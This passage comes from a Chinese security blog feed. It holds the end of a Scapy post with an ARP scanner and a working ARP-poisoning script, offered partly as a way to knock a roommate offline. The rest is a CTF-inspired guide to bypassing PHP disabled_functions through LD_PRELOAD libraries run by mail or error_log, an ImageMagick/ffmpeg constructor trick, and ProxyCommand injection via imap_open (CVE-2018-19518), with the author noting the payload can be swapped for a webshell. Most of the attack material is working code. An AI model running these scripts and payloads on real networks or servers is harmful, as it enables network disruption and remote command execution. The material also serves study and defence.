class="string">"-h:"</span>)</span><br><span class="line">    <span class="keyword">for</span> opt,arg <span class="keyword">in</span> opts:</span><br><span class="line">        <span class="keyword">if</span> opt <span class="keyword">in</span> (<span class="string">"-h"</span>):</span><br><span class="line">            host=arg</span><br><span class="line">    arp=Ether(dst=<span class="string">"ff:ff:ff:ff:ff:ff"</span>)/ARP(pdst=host)</span><br><span class="line">    ans,unans=srp(arp,timeout=<span class="number">0.5</span>,verbose=<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"[+] Scaned %d host"</span>%(len(ans))</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"Host      MAC"</span></span><br><span class="line">    <span class="keyword">for</span> s,h <span class="keyword">in</span> ans:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"{}      {}"</span>.format(h[<span class="string">"ARP"</span>].psrc,h[<span class="string">"ARP"</span>].hwsrc)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</span><br><span class="line">    scan(sys.argv[<span class="number">1</span>:])</span><br></pre></td></tr></tbody></table></figure><p></p><p>扫描结果如下：<br></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190405095129-545b4d58-5745-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><p></p><h2 id="ARP断网攻击"><a href="#ARP断网攻击" class="headerlink" title="ARP断网攻击"></a>ARP断网攻击</h2><h3 id="原理-7"><a href="#原理-7" class="headerlink" title="原理"></a>原理</h3><p>使用Scapy可以实现一个局域网的ARP投毒攻击，使对方断网，<strong> 整蛊一下舍友还是不错的23333 </strong><br>主机A（目标IP）：192.168.163.128<br>主机B（本机IP）：192.168.163.132<br>网关地址： 192.168.163.2</p><p>其实这个攻击原理也很简单，就是B主机告诉A主机我就是网关，然后A主机就会傻傻地相信B主机就是网关，就会把数据通过B主机转发出去给外网，如果B主机没有开启转发功能，流量就转发不出去，就会造成断网。</p><h3 id="实现-6"><a href="#实现-6" class="headerlink" title="实现"></a>实现</h3><p>代码实现：<br></p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> scapy.all <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> getopt</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">attack</span><span class="params">(argv)</span>:</span></span><br><span class="line">    opts, args = getopt.getopt(argv, <span class="string">"-h:-m:"</span>)</span><br><span class="line">    <span class="keyword">for</span> opt,arg <span class="keyword">in</span> opts:</span><br><span class="line">        <span class="keyword">if</span> opt <span class="keyword">in</span> (<span class="string">"-h"</span>):</span><br><span class="line">            host=arg</span><br><span class="line">        <span class="keyword">if</span> opt <span class="keyword">in</span> (<span class="string">"-m"</span>):</span><br><span class="line">            Bcast=arg</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"[+]: Status: \033[91m Attacking \033[0m"</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"[+]: Host: \033[92m %s \033[0m"</span>%(host)</span><br><span class="line">    pkt = ARP(psrc=Bcast, pdst=host, op=<span class="number">2</span>)</span><br><span class="line">    srloop(pkt,verbose=<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</span><br><span class="line">    attack(sys.argv[<span class="number">1</span>:])</span><br></pre></td></tr></tbody></table></figure><p></p><p>可以发现目标机已经连不上外网了<br></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190405084903-9b89eff8-573c-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><p></p><h3 id="防范"><a href="#防范" class="headerlink" title="防范"></a>防范</h3><p>防范也很简单，将网关的IP和MAC地址的关系绑定写入arp缓存表即可，具体怎么操作百度就有了，我这里就不多赘述了</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>虽然我列举的那些例子用Nmap和其它工具都能实现，但是我们不能总是做一个脚本小子和伸手党，多分析别人的工具是怎么实现这个功能的，然后自己尝试看看自己能不能编写一个这样类似的工具出来，多锻炼自己的动手能力。</p><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a href="https://nmap.org/man/zh/man-port-scanning-techniques.html" title="https://nmap.org/man/zh/man-port-scanning-techniques.html" target="_blank" rel="noopener">https://nmap.org/man/zh/man-port-scanning-techniques.html</a><br><a href="https://scapy.readthedocs.io/en/latest/usage.html" title="https://scapy.readthedocs.io/en/latest/usage.html" target="_blank" rel="noopener">https://scapy.readthedocs.io/en/latest/usage.html</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      
        <tags>
            
            <tag> 工具 </tag>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Bypass-disabled_functions一些思路总结</title>
      <link href="/2019/04/04/Bypass-disabled-functions%E4%B8%80%E4%BA%9B%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93/"/>
      <url>/2019/04/04/Bypass-disabled-functions%E4%B8%80%E4%BA%9B%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<blockquote><p>文章首发于先知社区<a href="https://xz.aliyun.com/t/4623" target="_blank" rel="noopener">https://xz.aliyun.com/t/4623</a></p></blockquote><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>PHP 的 disabled_functions主要是用于禁用一些危险的函数防止被一些攻击者利用</p><h1 id="Bypass思路"><a href="#Bypass思路" class="headerlink" title="Bypass思路"></a>Bypass思路</h1><h2 id="利用LD-PRELOAD"><a href="#利用LD-PRELOAD" class="headerlink" title="利用LD_PRELOAD"></a>利用LD_PRELOAD</h2><p>什么是LD_PRELOAD<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LD_PRELOAD是Linux系统的一个环境变量，用于动态库的加载，动态库加载的优先级最高，它可以影响程序的运行时的链接（Runtime linker），它允许你定义在程序运行前优先加载的动态链接库。这个功能主要就是用来有选择性的载入不同动态链接库中的相同函数。通过这个环境变量，我们可以在主程序和其动态链接库的中间加载别的动态链接库，甚至覆盖正常的函数库。一方面，我们可以以此功能来使用自己的或是更好的函数（无需别人的源码），而另一方面，我们也可以以向别人的程序注入程序，从而达到特定的目的。</span><br></pre></td></tr></tbody></table></figure><p></p><p>简单来说就是<code>LD_PRELOAD</code>指定的动态链接库文件，会在其它文件调用之前先被调用</p><h3 id="demo"><a href="#demo" class="headerlink" title="demo"></a>demo</h3><p>光看概念估计你可能会很懵，我们来写一个简单的demo来了解一下啥是<code>LD_PRELOAD</code><br>首先我们先写一个id.c，内容如下：<br></p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;dlfcn.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">uid_t</span> geteuid( <span class="keyword">void</span> ) { <span class="keyword">return</span> <span class="number">0</span>; }</span><br><span class="line"><span class="keyword">uid_t</span> getuid( <span class="keyword">void</span> ) { <span class="keyword">return</span> <span class="number">0</span>; }</span><br><span class="line"><span class="keyword">uid_t</span> getgid( <span class="keyword">void</span> ) { <span class="keyword">return</span> <span class="number">0</span>; }</span><br></pre></td></tr></tbody></table></figure><p></p><p>执行一波<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">qiyou@ubuntu:~/Desktop$ id</span><br><span class="line">uid=1000(qiyou) gid=1000(qiyou) groups=1000(qiyou)....</span><br><span class="line"></span><br><span class="line">qiyou@ubuntu:~$ whoami</span><br><span class="line">qiyou</span><br><span class="line"></span><br><span class="line">qiyou@ubuntu:~/Desktop$ gcc -shared -o id.so id.c</span><br><span class="line"></span><br><span class="line">qiyou@ubuntu:~/Desktop$ export LD_PRELOAD=./id.so</span><br><span class="line"></span><br><span class="line">qiyou@ubuntu:~/Desktop$ id</span><br><span class="line">uid=0(root) gid=0(root) egid=1000(qiyou)....</span><br><span class="line"></span><br><span class="line">qiyou@ubuntu:~/Desktop$ whoami</span><br><span class="line">root</span><br></pre></td></tr></tbody></table></figure><p></p><p>可以看到uid和gid都变为了0，权限也变为了root</p><p>我们可以用ldd查询一下依赖关系，可以发现id.so(我们编译的动态链接库)在其它动态链接库之前提前被加载了，也就是说我们的恶意代码中的函数覆盖了原本的动态链接库的函数</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190330005303-1e7ffcda-5243-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><h3 id="配合putenv-mail"><a href="#配合putenv-mail" class="headerlink" title="配合putenv+mail"></a>配合putenv+mail</h3><p>putenv官方手册是这么解释的：<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">putenv ( string $setting ) : bool</span><br><span class="line">添加setting到服务器环境。环境变量仅在当前请求的持续时间内存在。在请求结束时，环境将恢复到其原始状态。</span><br></pre></td></tr></tbody></table></figure><p></p><p>如果该函数未被ban掉的话，即使是禁用了其它常见的函数，也可能会导致rce<br>我们可以按照如下步骤：</p><ol><li>生成一个我们的恶意动态链接库文件</li><li>利用putenv设置LD_PRELOAD为我们的恶意动态链接库文件的路径</li><li>配合php的某个函数去触发我们的恶意动态链接库文件</li><li>Getshell</li></ol><p>那么php中的某个函数怎么去找呢，参考了<a href="https://www.tr0y.wang/2018/04/18/PHPDisalbedfunc/index.html" title="该文章" target="_blank" rel="noopener">该文章</a>，发现mail()函数可以使用，而mail()函数执行默认是会调用外部程序sendmail的，看一下php.ini就会发现默认调用<code>sendmail -t -i</code></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190330011754-96d9fcb4-5246-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><blockquote><p>PS：如果没有安装sendmail的话可以用<code>apt-get install sendmail</code>安装sendmail</p></blockquote><p>我们可以用strace查看一下mail函数调用的过程，可以很明显看出来执行了<code>sendmail -t -i</code><br></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190330023106-d0f82628-5250-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><p></p><p>然后我们可以使用 <code>readelf -Ws /usr/sbin/sendmail</code> 可以查看senmail都调用了哪一些函数，然后从中选几个即可，这里我们选择<code>getuid</code></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190330013011-4deed608-5248-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><p>然后就可以编写我们的动态连接程序<br>test.c<br></p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">payload</span><span class="params">()</span> </span>{</span><br><span class="line">        system(<span class="string">"ls &gt; test"</span>);</span><br><span class="line">}   </span><br><span class="line"><span class="function"><span class="keyword">int</span>  <span class="title">geteuid</span><span class="params">()</span> </span>{</span><br><span class="line"><span class="keyword">if</span> (getenv(<span class="string">"LD_PRELOAD"</span>) == <span class="literal">NULL</span>) { <span class="keyword">return</span> <span class="number">0</span>; }</span><br><span class="line">unsetenv(<span class="string">"LD_PRELOAD"</span>);</span><br><span class="line">payload();</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>然后生成我们的动态链接程序<br></p><figure class="highlight sh"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -c -fPIC test.c -o <span class="built_in">test</span></span><br><span class="line">gcc --share <span class="built_in">test</span> -o test.so</span><br></pre></td></tr></tbody></table></figure><p></p><p>然后编写php脚本mail.php<br></p><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">putenv(<span class="string">"LD_PRELOAD=./test.so"</span>);</span><br><span class="line">mail(<span class="string">""</span>,<span class="string">""</span>,<span class="string">""</span>,<span class="string">""</span>,<span class="string">""</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>执行一波，然后用strace查看调用过程是否执行了我们的<code>ls &gt; test</code>，可以发现成执行了我们的命令</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190330030422-76438ea2-5255-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190330025044-8eb6eefe-5253-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><h3 id="配合putenv-error-log"><a href="#配合putenv-error-log" class="headerlink" title="配合putenv+error_log"></a>配合putenv+error_log</h3><p>0ctf2019的<code>Wallbreaker Easy</code>中ban了mail函数，但是<code>error_log</code>没有ban掉，故我们可以用<code>error_log</code>来bypass disabled_functions</p><p>error_log的一些参数<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">error_log(error,type,destination,headers)</span><br><span class="line"></span><br><span class="line">当type为1时，服务器就会把error发送到参数 destination 设置的邮件地址</span><br></pre></td></tr></tbody></table></figure><p></p><p>编写php脚本，动态链接文件同上，error_log调用的过程中（当type为1时）和mail函数一样，也会调用sendmail，<br></p><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">putenv(<span class="string">"LD_PRELOAD=./test.so"</span>);</span><br><span class="line">error_log(<span class="string">"test"</span>,<span class="number">1</span>,<span class="string">""</span>,<span class="string">""</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190330030223-2f5a5796-5255-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190330030310-4b46e942-5255-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190330090346-ab7e1f1a-5287-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><h2 id="利用ImageMagick"><a href="#利用ImageMagick" class="headerlink" title="利用ImageMagick"></a>利用ImageMagick</h2><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>这个搭建环境有一丝丝繁琐，不过没关系，按照我以下步骤来应该问题不大QAQ<br></p><figure class="highlight sh"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1：apt-get update&amp;&amp;apt-get install imagemagick</span><br><span class="line">2：convert -version //如果安装成功会返回imagemagick版本号</span><br></pre></td></tr></tbody></table></figure><p></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190330121909-f6e6dfbc-52a2-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><p>安装几个依赖<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt-get install php-pear php-dev</span><br><span class="line">apt-get install libmagickwand-dev</span><br></pre></td></tr></tbody></table></figure><p></p><p>下载以及安装imagick<br></p><figure class="highlight sh"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">1.wget http://pecl.php.net/get/imagick-3.4.3.tgz</span><br><span class="line"></span><br><span class="line">2.tar -zxvf imagick-3.4.3.tgz</span><br><span class="line"></span><br><span class="line">3.phpize</span><br><span class="line"></span><br><span class="line">4.  ./configure --with-php-config=/usr/bin/php-config --with-imagick=/usr/<span class="built_in">local</span>/imagemagick //注意php-config可能会不同，要根据你具体的情况来修改</span><br><span class="line"></span><br><span class="line">5.make&amp;&amp;make install</span><br><span class="line"></span><br><span class="line">6.改一波php.ini，随便一行添加：extension = imagick.so</span><br><span class="line"></span><br><span class="line">7.然后php -r <span class="string">"phpinfo();"</span>|grep imagick，看有没有安装成功</span><br></pre></td></tr></tbody></table></figure><p></p><p>成功安装<br></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190330122537-de3708b0-52a3-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><p></p><p>然后安装ffmpeg<br></p><figure class="highlight sh"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt-get install ffmpeg</span><br><span class="line">ffmpeg -v 看看是否安装成功</span><br></pre></td></tr></tbody></table></figure><p></p><p>成功安装<br></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190330122857-55adcbd6-52a4-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><p></p><h3 id="如何利用"><a href="#如何利用" class="headerlink" title="如何利用"></a>如何利用</h3><p>那么我们应该如何利用呢，参考了飘零师傅的分析，可以知道当Imagick处理的文件是如下后缀的时候，就会调用外部程序ffmpeg去处理该文件<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmv,mov,m4v,m2v,mp4,mpg,mpeg,mkv,avi,3g2,3gp</span><br></pre></td></tr></tbody></table></figure><p></p><p>我们来写一个小demo来验证一下是否正确<br>img.php<br></p><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$img = <span class="keyword">new</span> Imagick(<span class="string">'img.mp4'</span>); <span class="comment">//img.mp4文件必须存在，否则就会不去调用ffmpeg</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>我们strace一下看看执行的过程，可以发现在执行的过程中调用了ffmpeg</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190330123601-52125e32-52a5-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><h3 id="配合-attribute-函数"><a href="#配合-attribute-函数" class="headerlink" title="配合__attribute__函数"></a>配合<code>__attribute__</code>函数</h3><p><strong> PS: <code>__attribute__</code>的介绍</strong><br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">__attribute__可以设置函数属性(Function Attribute)、变量属性(Variable Attribute)和类型属性(Type Attribute)。__attribute__前后都有两个下划线，并且后面会紧跟一对原括弧，括弧里面是相应的__attribute__参数</span><br><span class="line"></span><br><span class="line">__attribute__语法格式为：__attribute__ ( ( attribute-list ) )</span><br><span class="line">若函数被设定为constructor属性，则该函数会在main（）函数执行之前被自动的执行。类似的，若函数被设定为destructor属性，则该函数会在main（）函数执行之后或者exit（）被调用后被自动的执行。例如下面的程序：</span><br></pre></td></tr></tbody></table></figure><p></p><p>我们可以知道当该函数为<code>__attribute__((__constructor__))</code>的时候，会在main（）函数执行之前被自动的执行<br>所以我们尝试构造poc.c</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">__attribute__ ((__constructor__)) <span class="function"><span class="keyword">void</span> <span class="title">angel</span> <span class="params">(<span class="keyword">void</span>)</span></span>{</span><br><span class="line">    unsetenv(<span class="string">"LD_PRELOAD"</span>);</span><br><span class="line">    system(<span class="string">"ls &gt; test"</span>);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>然后生成我们的动态链接程序<br></p><figure class="highlight sh"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -c -fPIC poc.c -o poc</span><br><span class="line">gcc --share poc -o poc.so</span><br></pre></td></tr></tbody></table></figure><p></p><p>img.php<br></p><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">putenv(<span class="string">"LD_PRELOAD=./poc.so"</span>);</span><br><span class="line">$img = <span class="keyword">new</span> Imagick(<span class="string">'img.mp4'</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>运行一波，发现我们的命令执行成功了<br></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190330131614-f0c0b768-52aa-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><p></p><h2 id="利用imap-open-CVE-2018-19518"><a href="#利用imap-open-CVE-2018-19518" class="headerlink" title="利用imap_open (CVE-2018-19518)"></a>利用imap_open (CVE-2018-19518)</h2><p>php imap扩展用于在PHP中执行邮件收发操作。其imap_open函数会调用rsh来连接远程shell，而debian/ubuntu中默认使用ssh来代替rsh的功能（也就是说，在debian系列系统中，执行rsh命令实际执行的是ssh命令）。<br>因为ssh命令中可以通过设置<code>-oProxyCommand=</code>来调用第三方命令，攻击者通过注入注入这个参数，最终将导致命令执行漏洞。</p><p><strong> ssh的-oProxyCommand 参数 </strong><br>SSH 命令中用到了许多命令，其中我们可以使用 -o 参数来设置连接期间可用的各种选项。在建立SSH连接之前，我们可以设置 <code>ProxyCommand</code>参数，如下所示：<br></p><figure class="highlight sh"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">qiyou@ubuntu:~/<span class="built_in">test</span>$ ls</span><br><span class="line"></span><br><span class="line">qiyou@ubuntu:~/<span class="built_in">test</span>$ ssh -oProxyCommand=<span class="string">"touch test.txt"</span> 192.168.1.123</span><br><span class="line"></span><br><span class="line">ssh_exchange_identification: Connection closed by remote host</span><br><span class="line"></span><br><span class="line">qiyou@ubuntu:~/<span class="built_in">test</span>$ ls</span><br><span class="line">test.txt</span><br></pre></td></tr></tbody></table></figure><p></p><p>可以发现即使是ssh连接失败了，但是命令还是执行了。</p><p><code>CVE-2018-19518</code>的环境可以直接使用vulhub上的环境：<a href="https://github.com/vulhub/vulhub/tree/master/php/CVE-2018-19518" title="链接" target="_blank" rel="noopener">链接</a></p><p>直接上poc<br></p><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$exp = <span class="string">"echo test!test! &gt; /tmp/test"</span>;</span><br><span class="line">$base64_exp = base64_encode($exp);</span><br><span class="line">$server = <span class="string">"x -oProxyCommand=echo\t${base64_exp}|base64\t-d|sh}"</span>;</span><br><span class="line">imap_open(<span class="string">'{'</span>.$server.<span class="string">':143/imap}INBOX'</span>, <span class="string">''</span>, <span class="string">''</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"\n\nError: "</span>.imap_last_error());</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>执行一波，可以发现执行成功了，要想写webshell的话直接把我们的exp改一下就ok了，这里就不多赘述了<br></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190330100258-f0e06182-528f-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><p></p><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>被0ctf锤哭了，膜RR师傅Orz，比赛的时候没有做出来，赛后没有时间复现，等到想要复现的时候环境已经关了，只能是本地复现了，顺便总结了一下。</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190330134911-8ad0aa9e-52af-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a href="https://www.tr0y.wang/2018/04/18/PHPDisalbedfunc/index.html" title="https://www.tr0y.wang/2018/04/18/PHPDisalbedfunc/index.html" target="_blank" rel="noopener">https://www.tr0y.wang/2018/04/18/PHPDisalbedfunc/index.html</a><br><a href="https://www.jianshu.com/p/137ae1400337" title="https://www.jianshu.com/p/137ae1400337" target="_blank" rel="noopener">https://www.jianshu.com/p/137ae1400337</a><br><a href="https://blog.csdn.net/haoel/article/details/1602108" title="https://blog.csdn.net/haoel/article/details/1602108" target="_blank" rel="noopener">https://blog.csdn.net/haoel/article/details/1602108</a><br><a href="https://github.com/Bo0oM/PHP_imap_open_exploit/blob/master/exploit.php" title="https://github.com/Bo0oM/PHP_imap_open_exploit/blob/master/exploit.php" target="_blank" rel="noopener">https://github.com/Bo0oM/PHP_imap_open_exploit/blob/master/exploit.php</a></p><script>        